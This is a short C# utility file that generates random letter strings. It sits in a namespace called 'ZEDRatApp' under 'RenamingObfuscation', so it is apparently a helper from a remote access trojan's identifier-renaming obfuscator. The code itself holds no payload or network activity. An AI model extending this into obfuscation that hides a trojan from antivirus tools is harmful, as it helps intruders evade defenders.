using System;
using System.Text;

namespace ZEDRatApp.Forms.RenamingObfuscation.Classes
{
	public static class Utils
	{
		private static readonly Random random = new Random();

		private const string alphabet = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";

		public static string GenerateRandomString()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= Utils.random.Next(10, 20); i++)
			{
				stringBuilder.Append("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"[Utils.random.Next(0, "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".Length)]);
			}
			return stringBuilder.ToString();
		}
	}
}
